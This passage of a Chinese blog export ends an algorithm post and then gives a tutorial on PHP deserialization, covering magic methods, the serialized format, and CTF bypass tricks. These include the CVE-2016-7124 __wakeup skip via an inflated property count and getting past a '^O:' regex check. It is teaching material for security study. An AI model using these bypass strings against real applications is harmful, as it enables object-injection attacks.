class="line">1</span><br><span class="line">2</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h2 id="提示-2"><a class="markdownIt-Anchor" href="#提示-2">#</a> 提示</h2><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span> 的最短路有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span> 条，分别为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span> 条 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>→</mo><mn>2</mn><mo>→</mo><mn>4</mn><mo>→</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">1\to 2\to 4\to 5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span> 条 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>→</mo><mn>3</mn><mo>→</mo><mn>4</mn><mo>→</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">1\to 3\to 4\to 5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span>（由于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo>→</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">4\to 5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span> 的边有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span> 条）。</p><p>对于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>20</mn><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">20\%</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">%</span></span></span></span> 的数据，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">1\le N \le 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span></span></span></span>；<br>对于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>60</mn><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">60\%</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord">6</span><span class="mord">0</span><span class="mord">%</span></span></span></span> 的数据，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">1\le N \le 10^3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span>；<br>对于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>100</mn><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">100\%</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80556em;vertical-align:-0.05556em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">%</span></span></span></span> 的数据，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>6</mn></msup></mrow><annotation encoding="application/x-tex">1\le N\le10^6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>M</mi><mo>≤</mo><mn>2</mn><mo>×</mo><mn>1</mn><msup><mn>0</mn><mn>6</mn></msup></mrow><annotation encoding="application/x-tex">1\le M\le 2\times 10^6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.78041em;vertical-align:-0.13597em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span></span></span></span>。</p><h1 id="题解-3"><a class="markdownIt-Anchor" href="#题解-3">#</a> 题解</h1>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深搜 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化</title>
      <link href="/2023/11/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/11/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="php序列化问题-主要是找链-分析代码"><a class="markdownIt-Anchor" href="#php序列化问题-主要是找链-分析代码">#</a> PHP 序列化问题 -&gt; 主要是找链 分析代码</h2><h3 id="反序列化魔术方法"><a class="markdownIt-Anchor" href="#反序列化魔术方法">#</a> 反序列化魔术方法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()<span class="comment">//当一个对象创建时被调用</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//当一个对象销毁时被调用</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() <span class="comment">//当一个对象被当作一个字符串使用</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()<span class="comment">//在对象在被序列化之前运行</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()<span class="comment">//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>()<span class="comment">//获得一个类的成员变量时调用</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>()<span class="comment">//设置一个类的成员变量时调用</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()<span class="comment">//调用函数的方式调用一个对象时的回应方法</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>()<span class="comment">//当调用一个对象中的不能用的方法的时候就会执行这个函数</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__wakeup</span>() <span class="comment">//执行unserialize()时，先会调用这个函数</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() <span class="comment">//执行serialize()时，先会调用这个函数</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//对象被销毁时触发</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() <span class="comment">//用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() <span class="comment">//当尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure><h3 id="简介"><a class="markdownIt-Anchor" href="#简介">#</a> 简介</h3><p>序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。</p><p>在网上找到一个比较形象的例子</p><blockquote><p>比如：现在我们都会在淘宝上买桌子，桌子这种很不规则的东西，该怎么从一个城市运输到另一个城市，这时候一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当买家收到货后，就需要自己把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。</p></blockquote><p>php 将数据序列化和反序列化会用到两个函数</p><p><strong>serialize</strong> 将对象格式化成有序的字符串</p><p><strong>unserialize</strong> 将字符串还原成原来的对象</p><p>序列化的目的是方便数据的传输和存储，在 PHP 中，序列化和反序列化一般用做缓存，比如 session 缓存，cookie 等。</p><h3 id="常见的序列化格式"><a class="markdownIt-Anchor" href="#常见的序列化格式">#</a> 常见的序列化格式</h3><p>了解即可</p><ul><li>二进制格式</li><li>字节数组</li><li>json 字符串</li><li>xml 字符串</li></ul><h3 id="案例引入"><a class="markdownIt-Anchor" href="#案例引入">#</a> 案例引入</h3><p>简单的例子 (以数组为例子)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">array</span>(<span class="string">&#x27;xiao&#x27;</span>,<span class="string">&#x27;shi&#x27;</span>,<span class="string">&#x27;zi&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$user</span>.PHP_EOL);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user</span>));</span><br></pre></td></tr></table></figure><p>输出:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;xiao&quot;</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;shi&quot;</span>;i:<span class="number">2</span>;s:<span class="number">2</span>:<span class="string">&quot;zi&quot;</span>;&#125;</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; xiao</span><br><span class="line">    [<span class="number">1</span>] =&gt; shi</span><br><span class="line">    [<span class="number">2</span>] =&gt; zi</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>我们对上面这个例子做个简单讲解，方便大家入门</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;xiao&quot;</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;shi&quot;</span>;i:<span class="number">2</span>;s:<span class="number">2</span>:<span class="string">&quot;zi&quot;</span>;&#125;</span><br><span class="line">a:<span class="keyword">array</span>代表是数组，后面的<span class="number">3</span>说明有三个属性</span><br><span class="line">i:代表是整型数据<span class="keyword">int</span>，后面的<span class="number">0</span>是数组下标</span><br><span class="line">s:代表是字符串，后面的<span class="number">4</span>是因为xiao长度为<span class="number">4</span></span><br><span class="line">    </span><br><span class="line">依次类推</span><br></pre></td></tr></table></figure><p>序列化后的内容只有成员变量，没有成员函数，比如下面的例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;xiaoshizi&quot;</span>;<span class="variable language_">$this</span>-&gt;b=<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">happy</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出 (O 代表 Object 是对象的意思，也是类)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;xiaoshizi&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>而如果变量前是 protected，则会在变量名前加上 <code>\x00*\x00</code> ,private 则会在变量名前加上 <code>\x00类名\x00</code> , 输出时一般需要 url 编码，若在本地存储更推荐采用 base64 编码的形式，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;xiaoshizi&quot;</span>;<span class="variable language_">$this</span>-&gt;b=<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">happy</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这时候输出则会导致不可见字符 <code>\x00</code>  的丢失 (故要 urlencode)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot; * a&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;xiaoshizi&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot; test b&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h3 id="反序列化绕过小trick"><a class="markdownIt-Anchor" href="#反序列化绕过小trick">#</a> 反序列化绕过小 Trick</h3><h4 id="php71反序列化对类属性不敏感"><a class="markdownIt-Anchor" href="#php71反序列化对类属性不敏感">#</a> php7.1 + 反序列化对类属性不敏感</h4><p>我们前面说了如果变量前是 protected，序列化结果会在变量名前加上 <code>\x00*\x00</code></p><p>但在特定版本 7.1 以上则对于类属性不敏感，比如下面的例子即使没有 <code>\x00*\x00</code>  也依然会输出 <code>abc</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="绕过__wakeupcve-2016-7124"><a class="markdownIt-Anchor" href="#绕过__wakeupcve-2016-7124">#</a> 绕过__wakeup (CVE-2016-7124)</h4><blockquote><p>版本：<br>PHP5 &lt; 5.6.25<br>​ PHP7 &lt; 7.0.10</p></blockquote><p>利用方式： <code>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</code> <br>对于下面这样一个自定义类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;666&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果执行 <code>unserialize('O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;');</code>  输出结果为 <code>666</code> <br> 而把对象属性个数的值增大执行 <code>unserialize('O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;');</code>  输出结果为 abc</p><h4 id="绕过部分正则"><a class="markdownIt-Anchor" href="#绕过部分正则">#</a> 绕过部分正则</h4><p><code>preg_match('/^O:\d+/')</code>  匹配序列化字符串是否是对象字符串开头，这在曾经的 CTF 中也出过类似的考点</p><ul><li>利用加号绕过（注意在 url 里传参时 + 要编码为 %2B）</li><li>serialize (array (a));//a 为要反序列化的对象 (序列化结果开头是 a，不影响作为数组元素的 $a 的析构)</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">match</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span 